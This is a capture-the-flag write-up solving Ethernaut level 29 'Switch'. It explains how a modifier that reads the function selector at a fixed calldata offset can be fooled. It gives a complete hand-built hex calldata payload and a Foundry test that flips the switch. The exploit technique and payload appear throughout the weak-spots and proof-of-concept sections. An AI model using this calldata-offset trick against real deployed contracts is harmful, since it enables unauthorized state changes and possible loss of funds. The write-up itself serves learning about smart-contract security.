# Level 29 - Switch

## Objectives

- flip the switch

## Contract Overview

The `Switch` contract is designed to manage a switch that can be turned on or off. It includes two main functions: `turnSwitchOn` and `turnSwitchOff`, which respectively activate and deactivate the switch. The current state of the switch is stored in a boolean variable called `switchOn`.

The contract also features two modifiers: `onlyThis` and `onlyOff`. The `onlyThis` modifier restricts certain functions to be called only by the contract itself, ensuring internal control. On the other hand, the `onlyOff` modifier allows functions to be executed only if they match a specific function selector, in this case, `turnSwitchOff()`. This restriction adds an additional layer of security by ensuring that only authorized functions can turn off the switch.

The "`lipSwitch` function serves as a gateway for external calls to interact with the switch. It verifies that the provided function selector matches the `turnSwitchOff()` function and then forwards the call to the appropriate function. If the call is successful, the switch state is updated accordingly.

## Finding the weak spots

The objective is to change the state of `switchOn` to true. This can be achieved by invoking the `turnSwitchOn` function via the `flipSwitch` function.

```solidity

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

```

However, there's a unique modifier applied to the `flipSwitch` function, purportedly restricting it to only allow the execution of the `turnSwitchOff` function - `onlyOff`:

```solidity
    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

```

The main issue with this modifier lies in its hardcoded reliance on the offset of 68 to extract the function signature from the calldata.

Hence, the objective is to craft calldata containing two distinct function selectors simultaneously.

To exploit the contract, we'll utilize the call method and transmit calldata containing three distinct function selectors:

- `flipSwitch(bytes memory _data)`
- `turnSwitchOff()`
- `turnSwitchOn()`

We can calculate the functions selectors using Foundry.

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/SwitchFunctionSelectors.png)

So we have:

- `flipSwitch(bytes memory _data)` - 0x30c13ade
- `turnSwitchOff()` - 0x20606e15
- `turnSwitchOn()` - 0x76227e12

After we have our function selector values we can setup the calldata, from inspecting our contract, we know that the main issue with this modifier lies in its hardcoded reliance on the offset of 68 to extract the function signature from the calldata (as previously mentioned). That is why we know that the `onlyOff` modifier requires that our calldata has the value `0x20606e15` at an offset of 64 bytes.

Taking this into account, here's the structure our calldata should adhere to:

```solidity
// 30c13ade -> function selector for flipSwitch(bytes memory data)
// 0000000000000000000000000000000000000000000000000000000000000060 -> offset for the data field
// 0000000000000000000000000000000000000000000000000000000000000000 -> empty stuff so we can have bytes4(keccak256("turnSwitchOff()")) at 64 bytes
// 20606e1500000000000000000000000000000000000000000000000000000000 -> bytes4(keccak256("turnSwitchOff()"))
// 0000000000000000000000000000000000000000000000000000000000000004 -> length of data field
// 76227e1200000000000000000000000000000000000000000000000000000000 -> functin selector for turnSwitchOn()

```

So out calldata will look like:

```solidity
30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000

```

Now we are able to call our victim contract and send out calldata as the parameter to change `switchOn` variable to `true`.

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/29-Switch.t.sol))

```solidity

        emit log_named_string(
            "switchOn before attack",
            ethernautSwitch.switchOn() ? "true" : "false"
        );

        // 30c13ade -> function selector for flipSwitch(bytes memory data)
        // 0000000000000000000000000000000000000000000000000000000000000060 -> offset for the data field
        // 0000000000000000000000000000000000000000000000000000000000000000 -> empty stuff so we can have bytes4(keccak256("turnSwitchOff()")) at 64 bytes
        // 20606e1500000000000000000000000000000000000000000000000000000000 -> bytes4(keccak256("turnSwitchOff()"))
        // 0000000000000000000000000000000000000000000000000000000000000004 -> length of data field
        // 76227e1200000000000000000000000000000000000000000000000000000000 -> functin selector for turnSwitchOn()

        bytes
            memory callData = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";

        address(ethernautSwitch).call(callData);

        emit log_string(
            "--------------------------------------------------------------------------"
        );

        emit log_named_string(
            "switchOn after attack ",
            ethernautSwitch.switchOn() ? "true" : "false"
        );

```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/Switch.png)

## References

- [Solidity documentation about function selectors and function encoding](https://docs.soliditylang.org/en/v0.8.19/abi-spec.html#examples)

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [alex0207s](https://github.com/alex0207s/ethernaut-foundry-boilerplate)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)
